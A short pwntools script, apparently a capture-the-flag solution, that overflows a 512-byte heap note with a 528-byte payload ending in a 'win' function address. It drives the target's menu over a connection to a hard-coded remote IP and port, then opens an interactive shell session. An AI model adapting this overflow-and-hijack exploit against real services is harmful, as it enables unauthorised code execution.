from pwn import *
from struct import *

sampah = b"A" * 528
ez_win = pack("I", 0x4014a0)
sampah += ez_win

print(sampah)

#p = process("./ez")
p = remote("103.185.38.238", 15733)
p.recvline()
p.sendline(b"1")
p.recvuntil(b"size:")
p.sendline(b"512")
p.recvuntil(b"content:", drop=True)
p.sendline(b"AAAA")
p.recvuntil(b"Choice:")
p.sendline(b"1")
p.recvuntil(b"size:")
p.sendline(b"512")
p.recvuntil(b"content:", drop=True)
p.sendline(b"AAAA")
p.recvuntil(b"Choice:")
p.sendline(b"2")
p.recvuntil(b"Index:")
p.sendline(b"0")
p.recvuntil(b"content:", drop=True)
p.sendline(sampah)
p.recvuntil(b"Choice:")
p.sendline(b"3")
p.recvuntil(b"Index:")
p.sendline(b"1")

p.interactive()
